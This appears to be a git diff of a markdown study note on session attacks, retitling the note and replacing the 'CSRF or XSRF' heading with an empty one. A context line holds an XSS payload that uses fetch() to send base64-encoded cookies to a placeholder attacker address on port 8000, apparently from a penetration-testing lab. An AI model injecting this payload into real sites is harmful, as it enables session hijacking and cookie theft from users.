@@ -1,4 +1,4 @@
-# Session Attacks
+# 📉 Session Attacks 1
 
 ## Session Hijacking
 
@@ -185,4 +185,4 @@ We can use `fetch()`, which can fetch data (cookies) and send it to our server w
 <script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
 ```
 
-## CSRF or XSRF
+##
